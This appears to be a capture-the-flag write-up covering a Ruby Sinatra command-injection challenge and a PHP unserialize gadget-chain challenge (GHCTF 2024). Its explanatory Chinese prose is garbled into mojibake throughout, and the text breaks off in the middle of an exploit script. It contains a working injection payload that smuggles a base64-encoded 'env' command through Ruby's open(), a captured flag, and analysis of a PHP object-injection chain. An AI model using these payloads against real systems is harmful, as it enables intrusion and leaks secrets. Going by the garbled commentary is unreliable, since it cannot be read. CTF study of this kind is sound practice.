<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">&#x27;sinatra&#x27;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;digest&#x27;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;base64&#x27;</span></span><br><span class="line"></span><br><span class="line">get <span class="string">&#x27;/&#x27;</span> <span class="keyword">do</span></span><br><span class="line">  open(<span class="string">&quot;./view/index.html&quot;</span>, <span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">&#x27;/upload&#x27;</span> <span class="keyword">do</span></span><br><span class="line">  open(<span class="string">&quot;./view/upload.html&quot;</span>, <span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">post <span class="string">&#x27;/upload&#x27;</span> <span class="keyword">do</span></span><br><span class="line">  <span class="keyword">unless</span> params[<span class="symbol">:file</span>] &amp;&amp; params[<span class="symbol">:file</span>][<span class="symbol">:tempfile</span>] &amp;&amp; params[<span class="symbol">:file</span>][<span class="symbol">:filename</span>] &amp;&amp; params[<span class="symbol">:file</span>][<span class="symbol">:filename</span>].split(<span class="string">&#x27;.&#x27;</span>)[-<span class="number">1</span>] == <span class="string">&#x27;png&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;error&#x27;);location.href=&#x27;/upload&#x27;;&lt;/script&gt;&quot;</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">begin</span></span><br><span class="line">    filename = <span class="title class_">Digest</span><span class="symbol">:</span><span class="symbol">:MD5</span>.hexdigest(<span class="title class_">Time</span>.now.to_i.to_s + params[<span class="symbol">:file</span>][<span class="symbol">:filename</span>]) + <span class="string">&#x27;.png&#x27;</span></span><br><span class="line">    open(filename, <span class="string">&#x27;wb&#x27;</span>) &#123; |<span class="params">f</span>|</span><br><span class="line">      f.write open(params[<span class="symbol">:file</span>][<span class="symbol">:tempfile</span>],<span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="string">&quot;Upload success, file stored at <span class="subst">#&#123;filename&#125;</span>&quot;</span></span><br><span class="line">  <span class="keyword">rescue</span></span><br><span class="line">    <span class="string">&#x27;something wrong&#x27;</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">&#x27;/convert&#x27;</span> <span class="keyword">do</span></span><br><span class="line">  open(<span class="string">&quot;./view/convert.html&quot;</span>, <span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">post <span class="string">&#x27;/convert&#x27;</span> <span class="keyword">do</span></span><br><span class="line">  <span class="keyword">begin</span></span><br><span class="line">    <span class="keyword">unless</span> params[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">      <span class="keyword">return</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;error&#x27;);location.href=&#x27;/convert&#x27;;&lt;/script&gt;&quot;</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    file = params[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">    <span class="keyword">unless</span> file.index(<span class="string">&#x27;..&#x27;</span>) == <span class="literal">nil</span> &amp;&amp; file.index(<span class="string">&#x27;/&#x27;</span>) == <span class="literal">nil</span> &amp;&amp; file =~ <span class="regexp">/^(.+)\.png$/</span></span><br><span class="line">      <span class="keyword">return</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;dont hack me&#x27;);&lt;/script&gt;&quot;</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    res = open(file, <span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line">    headers <span class="string">&#x27;Content-Type&#x27;</span> =&gt; <span class="string">&quot;text/html; charset=utf-8&quot;</span></span><br><span class="line">    <span class="string">&quot;var img = document.createElement(\&quot;img\&quot;);\nimg.src= \&quot;data:image/png;base64,&quot;</span> + <span class="title class_">Base64</span>.encode64(res).gsub(<span class="regexp">/\s*/</span>, <span class="string">&#x27;&#x27;</span>) + <span class="string">&quot;\&quot;;\n&quot;</span></span><br><span class="line">  <span class="keyword">rescue</span></span><br><span class="line">    <span class="string">&#x27;something wrong&#x27;</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>

<p>ä¸Šä¼ åçš„æ–‡ä»¶ä¹Ÿåªèƒ½æ˜¯pngåç¼€çš„ï¼Œæ–‡ä»¶ä¸Šä¼ æ¼æ´æ˜¯ä¸å¤ªå¯èƒ½å­˜åœ¨çš„ã€‚</p>
<p>è¿™é‡Œè€ƒå¯Ÿçš„æ˜¯rubyçš„file openæ¼æ´</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">open()å‡½æ•°å¯ä»¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œ</span><br></pre></td></tr></table></figure>

<p>å°†æ–‡ä»¶åæ„é€ æˆæ¶æ„payloadå³å¯ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=|`echo+ZW52|base64+-d`;cat+1.png</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241230171141882.png" alt="image-20241230171141882"></p>
<img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241230171148314.png" alt="image-20241230171148314" style="zoom:67%;" />

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NSSCTF&#123;d95c546d-fb51-4696-b923-66d3758d20c6&#125;</span><br></pre></td></tr></table></figure>





<h2 id="GHCTF-2024-æ–°ç”Ÿèµ›-ezzz-unserialize"><a href="#GHCTF-2024-æ–°ç”Ÿèµ›-ezzz-unserialize" class="headerlink" title="[GHCTF 2024 æ–°ç”Ÿèµ›]ezzz_unserialize"></a>[GHCTF 2024 æ–°ç”Ÿèµ›]ezzz_unserialize</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author</span>: hey</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@message</span>: Patience is the key in life,I think you&#x27;ll be able to find vulnerabilities in code audits.</span></span><br><span class="line"><span class="comment"> * Have fun and Good luck!!!</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sakura</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$apple</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$strawberry</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span> -&gt; apple = <span class="variable">$a</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span> -&gt; apple;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$new</span> = <span class="variable language_">$this</span> -&gt; strawberry;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$new</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NoNo</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$peach</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$string</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span> -&gt; peach = <span class="variable">$string</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$var</span> = <span class="variable language_">$this</span> -&gt; <span class="variable">$name</span>;</span><br><span class="line">        <span class="variable">$var</span>[<span class="variable">$name</span>]();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BasaraKing</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$orange</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cherry</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$arg1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$arg1</span>,<span class="variable">$arg2</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="variable language_">$this</span> -&gt; orange;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$arg1</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span> -&gt; cherry -&gt; <span class="title function_ invoke__">ll2</span>(<span class="string">&#x27;b2&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UkyoTachibana</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$banana</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mangosteen</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$long</span> = @<span class="variable language_">$this</span> -&gt; banana -&gt; <span class="title function_ invoke__">add</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$long</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$arg1</span>,<span class="variable">$arg2</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span> -&gt; mangosteen -&gt; tt2)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Sakura was the best!!!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">E</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$e</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$arg1</span></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">array_walk</span>(<span class="variable">$this</span>, function (<span class="variable">$Monday</span>, <span class="variable">$Tuesday</span>) &#123;</span><br><span class="line">            <span class="variable">$Wednesday</span> = <span class="keyword">new</span> <span class="variable">$Tuesday</span>(<span class="variable">$Monday</span>);</span><br><span class="line">            <span class="keyword">foreach</span>(<span class="variable">$Wednesday</span> <span class="keyword">as</span> <span class="variable">$Thursday</span>)&#123;</span><br><span class="line">                <span class="keyword">echo</span> (<span class="variable">$Thursday</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UesugiErii</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$coconut</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">addMe</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;My time with Sakura was my happiest time&quot;</span>.<span class="variable language_">$this</span> -&gt; coconut;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$args</span></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">call_user_func</span>([<span class="variable">$this</span>, <span class="variable">$func</span>.<span class="string">&quot;Me&quot;</span>], <span class="variable">$args</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Heraclqs</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$grape</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$blueberry</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span> -&gt; blueberry)) == <span class="number">123</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span> -&gt; grape -&gt; hey;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MaiSakatoku</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Carambola</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$Kiwifruit</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span> -&gt; <span class="variable">$name</span> = <span class="variable">$value</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span> -&gt; Kiwifruit = <span class="string">&quot;Sakura&quot;</span>)&#123;</span><br><span class="line">            <span class="title function_ invoke__">strtolower</span>(<span class="variable">$this</span>-&gt; Carambola);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;GHCTF&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;GHCTF&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>çœ‹ä¸Šå»æœ‰ç‚¹å¤šï¼Œä½†æ˜¯é“¾å­ä¸é•¿ã€‚</p>
<p>ä»åå¾€å‰æ‰¾ï¼Œæ‰¾rceçš„åœ°æ–¹æˆ–è€…æ–‡ä»¶è¯»å–çš„åœ°æ–¹ã€‚</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">array_walk</span>(<span class="variable">$this</span>, function (<span class="variable">$Monday</span>, <span class="variable">$Tuesday</span>) &#123;</span><br><span class="line">            <span class="variable">$Wednesday</span> = <span class="keyword">new</span> <span class="variable">$Tuesday</span>(<span class="variable">$Monday</span>);</span><br><span class="line">            <span class="keyword">foreach</span>(<span class="variable">$Wednesday</span> <span class="keyword">as</span> <span class="variable">$Thursday</span>)&#123;</span><br><span class="line">                <span class="keyword">echo</span> (<span class="variable">$Thursday</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>);</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>

<p>è¿™ä¸œè¥¿æ€ä¹ˆè·ŸåŸç”Ÿç±»çš„foreachè¿™ä¹ˆåƒå‘¢ï¼Ÿï¼ŸæŸ¥ä¸€ä¸‹array_walkï¼Œå‘ç°æ˜¯è°ƒç”¨å›è°ƒå‡½æ•°çš„ä¸€ä¸ªå‡½æ•°</p>
<p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241231103913709.png" alt="image-20241231103913709"></p>
<p>å°¾éƒ¨æ‰¾åˆ°äº†ï¼Œå¾€ä¸Šæ‰¾ï¼Œ</p>
<p>Eç±»çš„geté­”æœ¯æ–¹æ³•ï¼Œè°ƒç”¨ä¸å­˜åœ¨çš„å±æ€§</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Heraclqs</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$grape</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$blueberry</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span> -&gt; blueberry)) == <span class="number">123</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span> -&gt; grape -&gt; hey;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sakura</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$apple</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$strawberry</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span> -&gt; apple = <span class="variable">$a</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span> -&gt; apple;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$new</span> = <span class="variable language_">$this</span> -&gt; strawberry;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$new</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>é“¾å­ç»“æŸï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">E::__get() -&gt; Heraclqs::__invoke() -&gt;Sakura::__toString() -&gt;Sakura::__destruct()</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œéœ€è¦ç»•è¿‡çš„å°±æ˜¯md5ï¼Œå¾ˆç®€å•ï¼Œæˆ‘æœ‰è„šæœ¬çš„ã€‚</p>
<p>ç„¶åéœ€è¦æ³¨æ„çš„å°±æ˜¯array_walkäº†ï¼</p>
<p>å…ˆè‡ªå·±æœ¬åœ°æµ‹ä¸€ä¸‹ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">E</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$e</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">print</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">array_walk</span>(<span class="variable">$this</span>, function (<span class="variable">$Monday</span>, <span class="variable">$Tuesday</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Monday =&gt; &quot;</span>.<span class="variable">$Monday</span>.<span class="string">&quot; | &quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Tuesday =&gt; &quot;</span>.<span class="variable">$Tuesday</span>.<span class="string">&quot; | &quot;</span>;</span><br><span class="line">            <span class="comment">// $Wednesday = new $Tuesday($Monday);</span></span><br><span class="line">            <span class="keyword">foreach</span>(<span class="variable">$Wednesday</span> <span class="keyword">as</span> <span class="variable">$Thursday</span>)&#123;</span><br><span class="line">                <span class="keyword">echo</span> (<span class="variable">$Thursday</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">E</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;e = <span class="string">&quot;123&quot;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;aaaa = <span class="string">&quot;321&quot;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;<span class="keyword">print</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">#Monday =&gt; 123 | Tuesday =&gt; e | Monday =&gt; 321 | Tuesday =&gt; aaaa | </span></span><br></pre></td></tr></table></figure>

<p>okçŸ¥é“æ€ä¹ˆåˆ©ç”¨äº†ã€‚</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sakura</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$apple</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$strawberry</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span> -&gt; apple;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$new</span> = <span class="variable language_">$this</span> -&gt; strawberry;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$new</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span 